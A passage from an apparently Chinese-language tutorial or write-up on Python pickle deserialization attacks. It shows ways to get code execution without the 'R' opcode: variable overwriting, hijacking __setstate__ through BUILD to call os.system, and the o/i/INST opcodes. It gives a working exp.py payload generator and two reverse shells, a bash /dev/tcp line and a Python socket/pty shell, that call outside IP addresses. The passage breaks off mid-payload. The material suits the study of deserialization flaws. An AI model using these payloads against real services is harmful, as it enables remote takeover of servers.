style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>————所以在不允许&lt;code>b'R'&lt;/code>的情况下，思路则是篡改secret中的name和categoriy，单纯的用&lt;code>b'c'&lt;/code>引入模块对Animal进行实例化，这一过程也相当于是执行了函数&lt;/p>
&lt;/details>
&lt;p>一种解决办法就是这个栗子中的，干脆就不rce，而是用&lt;code>b'c'&lt;/code>变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。&lt;/p>
&lt;h3 id="--使用__setstate__bb实现rce">&amp;ndash;&amp;raquo;使用&lt;code>__setstate__&lt;/code>&amp;amp;&lt;code>b'b'&lt;/code>实现rce&lt;/h3>
&lt;p>另一种方式是用BUILD指令&lt;code>b'b'&lt;/code>及进行rce。&lt;/p>
&lt;p>在pickle源码中BUILD指令是这样的&lt;/p>
&lt;p>&lt;img src="https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img">&lt;/p>
&lt;p>如果一个实例inst拥有&lt;code>__setstate__&lt;/code>方法，则把&lt;code>state&lt;/code>交给&lt;code>__setstate__&lt;/code>方法来处理；否则直接把&lt;code>state&lt;/code>这个&lt;code>dist&lt;/code>的内容合并到&lt;code>inst.__dict__ &lt;/code>内。&lt;/p>
&lt;p>如果一个类原本没有&lt;code>__setstate__&lt;/code>这个方法，当我们用&lt;code>{'__setstate__': os.system}&lt;/code>来BUILD这个对象，那么现在对象的&lt;code>__setstate__&lt;/code>就变成了&lt;code>os.system&lt;/code>；接下来利用&lt;code>&amp;quot;ls /&amp;quot;&lt;/code>来再次BUILD这个对象，则会执行&lt;code>setstate(&amp;quot;ls /&amp;quot;)&lt;/code> ，而此时&lt;code>__setstate__&lt;/code>已经被我们设置为&lt;code>os.system&lt;/code>，因此实现了rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;amelia&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">grade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;A1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Student&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">}(V__setstate__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">cos&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">system&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">ubVls /&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">b.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># shell = b&amp;#34;&amp;#34;&amp;#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;\nb.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png" alt="image-20210810025215320">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png" alt="image-20210810025143114">&lt;/p>
&lt;p>可以看到成功做到了rce~~反弹shell当然也可以&lt;/p>
&lt;h3 id="--使用_instantiateload_objload_instbobi实现rce">&amp;ndash;&amp;raquo;使用&lt;code>_instantiate()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>&amp;amp;&lt;code>b'o'&lt;/code>&amp;amp;&lt;code>b'i'&lt;/code>实现rce&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>_instantiate()&lt;/code>: Create a new object via klass(*args); Leads to arbitrary function call actually&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">hasattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__getinitargs__&amp;#34;&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Arbitrary function all&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;in constructor for &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">: &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exc_info&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__new__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_obj()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_obj&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Stack is ... markobject classobject arg1 arg2 ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_obj&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_inst()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_inst&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># read from user input&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">klass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># get args from stack&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_inst&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">list&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;((&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;lisubprocess&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Popen&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;print(&amp;#39;pwned!&amp;#39;)&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 反弹shell当然也可 都说了是rce了&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pty&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#34;182.92.191.192&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">50000&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dup2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fileno&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pty&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">spawn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
